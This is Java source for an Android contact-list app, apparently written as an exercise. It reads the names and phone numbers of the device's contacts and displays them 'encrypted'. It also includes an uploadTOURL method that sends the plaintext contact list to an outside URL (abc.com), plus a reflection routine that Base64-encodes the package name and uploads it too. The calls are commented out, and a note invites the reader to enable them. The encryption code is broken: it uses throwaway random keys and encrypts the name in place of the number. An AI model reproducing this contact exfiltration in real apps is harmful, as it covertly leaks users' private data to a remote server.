package com.example.contactlist;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;

import android.Manifest;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.widget.Toast;

import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;

import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;

public class MainActivity extends AppCompatActivity {

    //Initialize variables
    RecyclerView recyclerView;
    ArrayList<ContactModel> arrayList = new ArrayList<ContactModel>();
    MainAdapter adapter;
    private static final String UNICODE_FORMAT = "UTF-8";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        //Assign variable
        recyclerView = findViewById(R.id.recycler_view);

        //Check permission
        checkPermission();
    }

    private void checkPermission() {
        //Check condition

        if(ContextCompat.checkSelfPermission(MainActivity.this,
                Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED){
            //If permission is not granted, request permission
            ActivityCompat.requestPermissions(MainActivity.this,
                    new String[]{Manifest.permission.READ_CONTACTS}, 100);

        }else {
            //When permission is granted, create method
            getContactList();
        }
    }

    private void getContactList() {
        //Initialize URI
        Uri uri = ContactsContract.Contacts.CONTENT_URI;
        ArrayList<String> upload = new ArrayList<>();
        String encryptedName=""; String encryptedNumber="";

        //Sort by ascending
        String sort = ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME+" ASC";

        //Initialize cursor
        Cursor cursor = getContentResolver().query(
                uri, null,null,null,sort
        );
        //Check condition
        if(cursor.getCount()> 0){
            //When count is > 0, use while loop

            while (cursor.moveToNext()){
                //Get contact ID
                String id = cursor.getString(cursor.getColumnIndexOrThrow(
                        ContactsContract.Contacts._ID
                ));
                //Get contact Name
                String name = cursor.getString(cursor.getColumnIndexOrThrow(
                        ContactsContract.Contacts.DISPLAY_NAME
                ));

                //Initialize phone URI
                Uri uriPhone = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;

                //Initialize selection
                String selection = ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" =?";

                //Initialize phone cursor
                Cursor phoneCursor = getContentResolver().query(
                  uriPhone,null,selection,new String[]{id},null
                );
                //Check condition

                if (phoneCursor.moveToNext()){
                    //When phone cursor move to next
                    String number = phoneCursor.getString(phoneCursor.getColumnIndexOrThrow(
                            ContactsContract.CommonDataKinds.Phone.NUMBER
                    ));

                    //Encrypting the Contact Name and Number
                    try {
                        SecretKey key = generateKey("AES");
                        Cipher chipher;
                        chipher = Cipher.getInstance("AES");
                        byte[] encryptedData = encryptString(name, key, chipher);
                        encryptedName = new String(encryptedData);
                    }catch (Exception e){

                    }
                    try {
                        SecretKey key = generateKey("AES");
                        Cipher chipher;
                        chipher = Cipher.getInstance("AES");
                        byte[] encryptedData = encryptString(name, key, chipher);
                        encryptedNumber = new String(encryptedData);
                    }catch (Exception e){

                    }
                    //Initialize contact Model
                    ContactModel model = new ContactModel();

                    //Set name
                    model.setName(encryptedName);

                    //Set number
                    model.setNumber(encryptedNumber);

                    //Add model in ArrayList
                    arrayList.add(model);
                    //Add name & number to a list to be uploaded
                    upload.add(name);
                    upload.add(number);

                    //Close phone cursor
                    phoneCursor.close();
                }
            }
            //Close cursor
            cursor.close();

            /*Nesta parte do codigo fiz a chamada dos metodos para completar os add-on
            E o envio da lista ao URL ficticio.
            O metodo uploadTOURL(upload) está comentado porque a Class OutputStream está a gerar erro.
            Acredito que seja por o URL estar incalcansavel. Para testar, por favor remova o comentário.

            */
            //Uploading the list to a fictitious URL
            //uploadTOURL(upload);

            //Using Reflection to Encode the Package name and Upload the String to a fictitious URL
            //ReflectionPackage();

        }
        //Set layout manager
        recyclerView.setLayoutManager(new LinearLayoutManager(this));

        //Initialize adapter
        adapter = new MainAdapter(this, arrayList);

        //Set adapter
        recyclerView.setAdapter(adapter);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        //Check condition
        if(requestCode == 100 && grantResults.length > 0 && grantResults[0]
            == PackageManager.PERMISSION_GRANTED){
            //Permission granted, call method
            getContactList();
        }else{
            //When permission is denied, display Toast
            Toast.makeText(MainActivity.this, "Permission Denied"
                    , Toast.LENGTH_SHORT).show();
            //call check permission method
            checkPermission();
        }
    }

    private void uploadTOURL(ArrayList<String> upload) {
        try {
            URL url = new URL("https://www.abc.com/");
            URLConnection urlConnection = url.openConnection();
            urlConnection.setDoOutput(true);
            OutputStream outputStream = urlConnection.getOutputStream();
            PrintWriter writer = new PrintWriter(outputStream);
            writer.print(upload);
            outputStream.close();

        }catch (Exception exception){
            System.out.println("Algo Deu Errado!!!!");
            exception.printStackTrace();
        }
    }

    public void ReflectionPackage() {

        try {
            Class classe = Class.forName("com.example.ContactList");
            String packageName = classe.getPackage().toString();
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                String encoded = Base64.getEncoder().encodeToString(packageName.getBytes());
                String[] toArrayList = encoded.split("");
                ArrayList<String> upload = new ArrayList<>(Arrays.asList(toArrayList));
                uploadTOURL(upload);
            }
        }
        catch (Exception e){
            System.out.println("CLASS Não Encontrada");
            e.printStackTrace();
        }
    }

    public static SecretKey generateKey(String encryptionType){
        try {
            KeyGenerator keyGenerator = KeyGenerator.getInstance(encryptionType);
            SecretKey myKey = keyGenerator.generateKey();
            return myKey;
        }
        catch (Exception exception)
        {
            return null;
        }
    }

    public static byte[] encryptString(String dataToEncrypt, SecretKey myKey, Cipher cipher){

        try {
            byte[] text = dataToEncrypt.getBytes(UNICODE_FORMAT);
            cipher.init(Cipher.ENCRYPT_MODE, myKey);
            byte[] textEncrypted = cipher.doFinal(text);
            return textEncrypted;

        }
        catch (Exception exception)
        {
            return null;

        }
    }

    public static String decryptString(byte[] dataToDecrypt, SecretKey myKey, Cipher cipher){
        try {
            cipher.init(Cipher.DECRYPT_MODE, myKey);
            byte[] textDecrypted = cipher.doFinal(dataToDecrypt);
            String result = new String(textDecrypted);
            return result;
        }
        catch (Exception exception)
        {
            System.out.println(exception);
            return null;
        }
    }
}